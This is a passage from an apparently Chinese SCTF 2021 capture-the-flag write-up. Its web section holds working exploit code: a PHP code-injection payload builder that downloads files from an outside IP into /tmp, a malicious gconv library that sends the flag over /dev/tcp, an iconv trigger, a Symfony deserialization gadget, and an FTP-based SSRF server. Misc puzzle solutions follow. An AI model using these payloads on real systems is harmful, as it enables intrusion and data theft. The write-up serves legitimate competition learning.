class="line">def <span class="title function_ invoke__">makeSTR</span>(s):</span><br><span class="line"></span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> each in s:</span><br><span class="line"></span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">hex</span>(<span class="number">255</span> - <span class="title function_ invoke__">ord</span>(each)))[<span class="number">2</span>:].<span class="title function_ invoke__">upper</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> f<span class="string">&quot;[~&#123;ss&#125;][!%FF]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">组成 system(next(getallheaders()));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a=whoami</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">make</span>(xd):</span><br><span class="line"></span><br><span class="line">    a = xd.<span class="title function_ invoke__">strip</span>(<span class="string">&quot;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    aa = a.<span class="title function_ invoke__">split</span>(<span class="string">&quot;(&quot;</span>)</span><br><span class="line"></span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> each in aa[:-<span class="number">1</span>]:</span><br><span class="line"></span><br><span class="line">        s += <span class="title function_ invoke__">one</span>(each)</span><br><span class="line"></span><br><span class="line">    s += <span class="string">&quot;)&quot;</span> * (<span class="title function_ invoke__">len</span>(aa) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>

<p>然后看一下 php 文档，[<a href="https://www.php.net/manual/en/functions.arguments.php#:~:text=Example%20%2310%20Using%20...%20to%20provide%20arguments]">https://www.php.net/manual/en/functions.arguments.php#:~:text=Example%20%2310%20Using%20...%20to%20provide%20arguments]</a>(<a href="https://www.php.net/manual/en/functions.arguments.php#:~:text=Example">https://www.php.net/manual/en/functions.arguments.php#:~:text=Example</a> #10 Using … to provide arguments) 知道可以用 <code>...[1,2]</code> 来传多个参数，可以用 <code>create_function</code> 来执行任意 php 代码，还可以序列化传数组，用反序列化函数弄出来就行了。</p>
<p>接下来就是 iconv bypass df 了，抄一下 bytectf final 的，用 filter 绕函数就行。问题比较大就是怎么写文件，调了半天，最后用 <code>SplFileObject</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import craft</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">arb</span>(s):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> craft.<span class="title function_ invoke__">makeSTR</span>(s) + <span class="string">&quot;.&quot;</span> + craft.<span class="title function_ invoke__">make</span>(<span class="string">&quot;var_dump()&quot;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:3333&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &quot;&quot;&quot;a:2:&#123;i:0;s:198:&quot;)&#123;&#125;$url = &#x27;http://47.100.54.220/poc.so&#x27;;$file = new SplFileObject($url, &quot;r&quot;);$a = &quot;&quot;;while(!$file-&gt;eof()) &#123;$a = $a.$file-&gt;fgets();&#125;$file=new SplFileObject(&#x27;/tmp/payload.so&#x27;,&#x27;w&#x27;);$file-&gt;fwrite($a);//&quot;;i:1;s:0:&quot;&quot;;&#125;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span><span class="string">&quot;a:2:&#123;i:0;s:208:&quot;</span>)&#123;&#125;<span class="variable">$url</span> = <span class="string">&#x27;http://47.100.54.220/gconv-modules&#x27;</span>;<span class="variable">$file</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="variable">$url</span>, <span class="string">&quot;r&quot;</span>);<span class="variable">$a</span> = <span class="string">&quot;&quot;</span>;<span class="keyword">while</span>(!<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;<span class="variable">$a</span> = <span class="variable">$a</span>.<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">fgets</span>();&#125;<span class="variable">$file</span>=<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/tmp/gconv-modules&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">fwrite</span>(<span class="variable">$a</span>);<span class="comment">//&quot;;i:1;s:0:&quot;&quot;;&#125;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code = craft.<span class="title function_ invoke__">makeSTR</span>(<span class="string">&#x27;call_user_func&#x27;</span>) + <span class="string">&#x27;(&#x27;</span> + craft.<span class="title function_ invoke__">makeSTR</span>(<span class="string">&quot;create_function&quot;</span>)</span><br><span class="line"></span><br><span class="line">code += <span class="string">&quot;(&quot;</span></span><br><span class="line"></span><br><span class="line">code += <span class="string">&quot;...&quot;</span> + craft.<span class="title function_ invoke__">makeSTR</span>(<span class="string">&quot;unserialize&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="title function_ invoke__">arb</span>(payload) + <span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line">code += <span class="string">&quot;));&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#code += craft.make(&quot;var_dump(end(getallheaders()))&quot;) + &quot;;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(code)</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://172.17.16.1/poc.so&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="variable">$url</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( ! <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$a</span>.<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">fgets</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/tmp/p.so&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>-&gt;<span class="title function_ invoke__">fwrite</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">gconv</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">gconv_init</span>() &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">puts</span>(<span class="string">&quot;pwned&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;/readflag&gt;/dev/tcp/ip/port&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考<a href="https://xz.aliyun.com/t/8669#toc-5">https://xz.aliyun.com/t/8669#toc-5</a></p>
<p>用原生类把so和modules上传到tmp然后用伪协议读一下触发：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3><span id="upload-it-2">upload it 2</span><a href="#upload-it-2" class="header-anchor"></a></h3><p>根据upload it 1 得知用sleep触发，还是一样用LazyString调一下sandbox的backdoor方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">String</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">LazyString</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">value</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;value = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">sandbox</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">evil</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evil = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>\<span class="title">LazyString</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = [<span class="keyword">new</span> sandbox,<span class="string">&quot;backdoor&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$lazy</span> = <span class="keyword">new</span> <span class="title class_">LazyString</span>(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$part1</span> = <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;upload_path|s:45:&quot;/tmp/sandbox/2b2f38818b2ac2cd6df0b9cd09e1ad88&quot;;|&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$part1</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$lazy</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">%<span class="number">75</span>%<span class="number">70</span>%<span class="number">6</span>c%<span class="number">6</span>f%<span class="number">61</span>%<span class="number">64</span>%<span class="number">5</span>f%<span class="number">70</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">68</span>%<span class="number">7</span>c%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">35</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">2</span>f%<span class="number">74</span>%<span class="number">6</span>d%<span class="number">70</span>%<span class="number">2</span>f%<span class="number">73</span>%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">64</span>%<span class="number">62</span>%<span class="number">6</span>f%<span class="number">78</span>%<span class="number">2</span>f%<span class="number">32</span>%<span class="number">62</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">38</span>%<span class="number">31</span>%<span class="number">38</span>%<span class="number">62</span>%<span class="number">32</span>%<span class="number">61</span>%<span class="number">63</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">64</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">66</span>%<span class="number">30</span>%<span class="number">62</span>%<span class="number">39</span>%<span class="number">63</span>%<span class="number">64</span>%<span class="number">30</span>%<span class="number">39</span>%<span class="number">65</span>%<span class="number">31</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">38</span>%<span class="number">38</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">7</span>c%<span class="number">4</span>f%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">35</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">53</span>%<span class="number">79</span>%<span class="number">6</span>d%<span class="number">66</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">79</span>%<span class="number">5</span>c%<span class="number">43</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">70</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">6</span>e%<span class="number">74</span>%<span class="number">5</span>c%<span class="number">53</span>%<span class="number">74</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">67</span>%<span class="number">5</span>c%<span class="number">4</span>c%<span class="number">61</span>%<span class="number">7</span>a%<span class="number">79</span>%<span class="number">53</span>%<span class="number">74</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">67</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">32</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">00</span>%<span class="number">53</span>%<span class="number">79</span>%<span class="number">6</span>d%<span class="number">66</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">79</span>%<span class="number">5</span>c%<span class="number">43</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">70</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">6</span>e%<span class="number">74</span>%<span class="number">5</span>c%<span class="number">53</span>%<span class="number">74</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">67</span>%<span class="number">5</span>c%<span class="number">4</span>c%<span class="number">61</span>%<span class="number">7</span>a%<span class="number">79</span>%<span class="number">53</span>%<span class="number">74</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">67</span>%<span class="number">00</span>%<span class="number">76</span>%<span class="number">61</span>%<span class="number">6</span>c%<span class="number">75</span>%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>b%<span class="number">4</span>f%<span class="number">3</span>a%<span class="number">37</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">73</span>%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">64</span>%<span class="number">62</span>%<span class="number">6</span>f%<span class="number">78</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">00</span>%<span class="number">73</span>%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">64</span>%<span class="number">62</span>%<span class="number">6</span>f%<span class="number">78</span>%<span class="number">00</span>%<span class="number">65</span>%<span class="number">76</span>%<span class="number">69</span>%<span class="number">6</span>c%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">35</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">2</span>f%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">31</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">75</span>%<span class="number">70</span>%<span class="number">6</span>c%<span class="number">6</span>f%<span class="number">61</span>%<span class="number">64</span>%<span class="number">5</span>f%<span class="number">70</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">68</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">4</span>e%<span class="number">3</span>b%<span class="number">7</span>d%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">38</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">62</span>%<span class="number">61</span>%<span class="number">63</span>%<span class="number">6</span>b%<span class="number">64</span>%<span class="number">6</span>f%<span class="number">6</span>f%<span class="number">72</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">7</span>d%<span class="number">7</span>d</span><br></pre></td></tr></table></figure>

<p>贴burp上decode一下post到tmp目录覆盖session</p>
<h3><span id="goftp">GoFTP</span><a href="#goftp" class="header-anchor"></a></h3><p>根据题目描述和 hint 信息可以大概猜到预期通过 FTP 来做 SSRF（PASV 模式传文件时，客户端会建立一个新的连接到服务端指定端口）。具体的 HTTP 请求内容在比赛的时候是通过结合逆向和动态调试的方式，触发 binary &#x2F;api&#x2F;register 接口本地监听获得的。在通过 SSRF 注册 username 为 admin 的用户之后，可正常登录通过访问 &#x2F;admin 获得 flag。</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">l = listen(<span class="number">2121</span>)</span><br><span class="line"></span><br><span class="line">_ = l.wait_for_connection()</span><br><span class="line"></span><br><span class="line">data = listen(<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">l.sendline(b<span class="string">&#x27;220 Test FTP Server&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.recvuntil(b<span class="string">&#x27;USER &#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.sendline(b<span class="string">&#x27;331 Password required&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.recvuntil(b<span class="string">&#x27;PASS&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.sendline(b<span class="string">&#x27;230 User logged in&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.recvuntil(b<span class="string">&#x27;TYPE&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.sendline(b<span class="string">&#x27;200 Switching to Binary mode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.recvuntil(b<span class="string">&#x27;PASV&#x27;</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">l.sendline(b<span class="string">&#x27;227 Entering Passive Mode (127,0,0,1,35,40)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.recvuntil(b<span class="string">&#x27;STOR&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.sendline(b<span class="string">&#x27;150 Opening BINARY mode data connection for foo.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#_ = data.wait_for_connection()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#data.recvall()</span></span><br><span class="line"></span><br><span class="line">l.sendline(b<span class="string">&#x27;226 Transfer complete&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.recvuntil(b<span class="string">&#x27;QUIT&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PUT /api/user HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1:9000</span><br><span class="line"></span><br><span class="line">User-Agent: GRequests/0.10</span><br><span class="line"></span><br><span class="line">Content-Length: 71</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">&#123;&quot;email&quot;: &quot;admin@foo.org&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;ahDi3aid&quot;&#125;</span><br></pre></td></tr></table></figure>

<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h3><span id="this-is-a-tree">This_is_A_tree</span><a href="#this-is-a-tree" class="header-anchor"></a></h3><blockquote>
<p>一颗圣诞树，还有好多礼物,flag需要SCTF{}噢 ,a beautiful tree,U need to know some Chinese traditional knowledge,flag need a “SCTF{your_flag}”</p>
</blockquote>
<p>遍历bata+base64+中文转二进制转ascii</p>
<p>中序遍历后的字符串为：Q2hpbmVzZSB0cmFkaXRpb25hbCBjdWx0dXJlIGlzIGJyb2FkIGFuZCBwcm9mb3VuZCEgU28gSSBXYW50IEdpdmUgWW91IE15IEZsYWcgQnV0IFlvdSBOZWVkIERlY29kZSBJdC5FbmpveSBUaGUgRmxhZyEhOuW4iCDlhZEg5aSNIOaNnyDlt70g6ZyHIOaZiyDlp6Qg5aSn6L+HIOiuvCDlmazll5Eg6ZyHIOaBkiDoioIg6LGrIA&#x3D;&#x3D;</p>
<p>base64后：</p>
<p>Chinese traditional culture is broad and profound! So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫</p>
<p><a href="https://github.com/BjdsecCA/BJDCTF2020_January%E5%8F%82%E8%80%83%E9%87%8C%E9%9D%A2%E7%9A%84%E4%BC%8F%E7%BE%B2%E5%85%AD%E5%8D%81%E5%9B%9B%E5%8D%A6">https://github.com/BjdsecCA/BJDCTF2020_January参考里面的伏羲六十四卦</a></p>
<p>然后中文转二进制：</p>
<p>010000110110100000110001011011100100000101011111011110010111100101100100011100110010000100</p>
<p>二进制转出ascii</p>
<p>Ch1nA_yyds!</p>
<h3><span id="fumo-xor-cli">fumo_xor_cli</span><a href="#fumo-xor-cli" class="header-anchor"></a></h3><blockquote>
<p> nc 124.70.150.39 2333</p>
</blockquote>
<blockquote>
<p> nc 123.60.107.154 2333</p>
</blockquote>
<blockquote>
<p> FUMOFUMO FUMO FUMOFUMO?(flag中没有数字) </p>
</blockquote>
<p><img src="../images/2021-12-25-SCTF/20211228082941352.jpg" alt="img"></p>
<p>Fumo 中间夹着两段彩色的文字，其中一部分包含一个链接</p>
<p><a href="https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA">https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA</a></p>
<p>里面有张图</p>
<p><a href="https://imgtu.com/i/TpMSkq">https://imgtu.com/i/TpMSkq</a> </p>
<p><img src="../images/2021-12-25-SCTF/20211228082945284.jpg" alt="img"></p>
<p><img src="../images/2021-12-25-SCTF/1.jpg" alt="img"></p>
<p>按照题目名称的意思，提取这里面的每个像素点，和 cli 里面的那个进行异或</p>
<p>图片中一行100个 总共 13300 个色块</p>
<p><img src="../images/2021-12-25-SCTF/20211228082941059.jpg" alt="img"></p>
<p>Shell 里拿 pwntools 接收 提取出来有 6650 个字符，正好2倍</p>
<p><img src="../images/2021-12-25-SCTF/20211228082943505.jpg" alt="img"></p>
<p>图里这个顺序正好和shell里第二段五颜六色的字符颜色顺序一样，异或之后发现前6650位几乎完全一致，后面不一样</p>
<p>后面那一半和 cli 前面那部分彩色的颜色（aaaaa….）来异或</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 